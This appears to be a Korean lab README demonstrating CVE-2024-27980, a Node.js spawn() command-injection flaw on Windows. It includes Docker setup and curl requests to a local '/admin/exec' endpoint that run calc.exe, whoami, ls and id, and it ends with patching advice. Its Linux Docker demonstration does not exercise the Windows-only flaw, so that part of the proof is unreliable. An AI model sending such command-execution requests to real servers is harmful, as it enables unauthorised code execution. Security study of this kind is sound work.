# CVE-2024-27980 - Improper handling of batch file extensions in Node.js child_process.spawn()

## 요약
- **CVE 번호**: CVE-2024-27980
- **취약점 설명**: Node.js의 `child_process.spawn()` 및 `spawnSync()` 함수가 Windows 환경에서 배치 파일(.bat) 확장자 처리를 부적절하게 하여, `shell: false` 옵션을 사용했음에도 명령어 주입이 발생할 수 있다.
- **영향 받는 버전**: Node.js 18.x, 20.x, 22.x 릴리스 라인 (Windows 환경)
- **취약점 유형**: Command Injection
- **PoC 방식**: `shell: false` 설정 상태에서도 명령어 실행이 가능함을 확인


## 환경 구성 및 실행
- 테스트 서버는 Node.js 20 버전을 사용하여 Docker를 구성한다.
- `http://localhost:3000/admin/exec` 에 POST 요청을 보내면서 명령어를 실행한다.

### 환경 요구사항
- Windows OS (Docker Desktop 설치)
- Node.js 설치 (20.x 버전)
- Git Bash, PowerShell 사용

아래는 docker 환경 구축을 하는 방법이며, 사진은 해당 결과물이다.
```
docker-compose build --no-cache
```
![image](https://github.com/user-attachments/assets/b1266083-393e-4671-af16-788d5efdf557)
<br>
```
docker-compose up -d
```
![image](https://github.com/user-attachments/assets/587fdcf7-c68c-48d6-90f1-1e01fe0c7cb8)

## 결과
### [윈도우 환경] 
- Docker 컨테이너는 리눅스 기반으로 동작하기 때문에, Windows 전용 프로그램(calc.exe 등)은 실행되지 않는다.
- 하지만, 실제 windows 환경에서는 관련 명령어 시도가 가능한 것을 확인할 수 있다. (node 설치 필요) 아래 과정을 통해 프로그램 실행이 가능한 것을 확인할 수 있다. (calc.exe 출력)

1. ../src 경로에서 `node app.js` 실행
2. 아래 명령어 입력
```
curl -X POST http://localhost:3001/admin/exec \
-H "Content-Type: application/json" \
-d '{"cmd": "calc.exe", "args": []}'
```
실제 계산기 프로그램이 자동으로 실행되는 것을 확인할 수 있다.

### [Docker 환경]
리눅스 기본 명령어인 `ls`, `id`, `whoami` 등을 curl 명령어로 요청을 보내며 PoC를 진행한다.
아래는 실행 명령어와 해당 명령어를 입력했을 때 출력된 결과이다.

1. whoami 명령어
```
curl -X POST http://localhost:3000/admin/exec \
-H "Content-Type: application/json" \
-d '{"cmd":"whoami","args":[]}'
```
![image](https://github.com/user-attachments/assets/f2fc8d40-396c-4648-bcec-312ee34fa681)

2. ls 명령어
```
curl -X POST http://localhost:3000/admin/exec \
-H "Content-Type: application/json" \
-d "{\"cmd\":\"ls\",\"args\":[\"-l\"]}"
```
![image](https://github.com/user-attachments/assets/b4b75a31-ea85-4173-b0e4-8db37d9ba988)

3. id 명령어
```
curl -X POST http://localhost:3000/admin/exec \
-H "Content-Type: application/json" \
-d '{"cmd":"id","args":[]}'
```
![image](https://github.com/user-attachments/assets/61b84ab2-60e3-40c1-81c1-e5ceec0f2820)

위 curl 명령어를 통해 실행한 결과는, 터미널에서 직접 해당 명령어들을 입력했을 때 출력되는 결과와 동일함을 확인할 수 있다.

## 정리
- CVE-2024-27980은 Windows 환경에서 child_process.spawn() 및 spawnSync()가 확장자 자동 처리 과정에서 명령어 주입을 방지하지 못해 발생하는 취약점이다.
- `shell: false` 설정만으로는 Windows 환경에서 완벽한 명령어 검증이 되지 않으며, 사용자가 입력한 명령어를 통해 프로그램 실행이 가능해질 수 있다.
- PoC 결과, Docker 리눅스 컨테이너에서는 리눅스 기본 명령어 실행이 가능했으며, Windows 로컬 환경에서는 calc.exe 실행을 통해 프로그램 실행이 가능함을 확인하였다.
- 해당 취약점을 방지하기 위해 Node.js를 최신 버전(v20.15.1 이상)으로 업데이트하고, 사용자 입력값에 대한 엄격한 검증이 필요하다

---
## 참고
https://nodejs.org/en/blog/vulnerability/july-2024-security-releases
https://nvd.nist.gov/vuln/detail/CVE-2024-27980
https://knvd.krcert.or.kr/detailSecNo.do?IDX=6235
